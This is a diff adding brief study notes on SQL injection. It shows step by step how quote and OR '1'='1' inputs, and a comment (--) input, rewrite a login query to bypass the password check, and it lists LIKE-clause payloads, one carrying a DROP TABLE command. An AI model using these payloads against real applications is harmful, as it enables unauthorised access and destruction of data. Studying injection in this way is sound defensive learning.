@@ -1,0 +1,22 @@
+### OR payload injection
+
+    query: SELECT * FROM users WHERE username = 'admin' AND password = 'pass123'
+    step1: admin'
+    query: SELECT * FROM users WHERE username = 'admin'' AND password = 'pass123'
+    step2: admin' OR '1' = '1'
+    query: SELECT * FROM users WHERE username = 'admin' OR '1' = '1'' AND password = 'pass123'
+    step3: admin' OR '1' = '1
+    query: SELECT * FROM users WHERE username = 'admin' OR '1' = '1' AND password = 'pass123'
+    sql: check condition 1 and condition 2 -> OR condition 1 and condition 3
+
+### comment injection
+
+    query: SELECT * FROM users WHERE username = 'admin' AND password = 'pass123'
+    step1: admin'--
+    query: SELECT * FROM users WHERE username = 'admin'--' AND password = 'pass123'
+
+### OR payload
+
+    like '%"&arguments.ItemNumber&"%'"
+    like '%"admin" OR "1"="1" DROP TABLE 'INJ_TEST'%'"
+    like '%"admin" OR "1=1
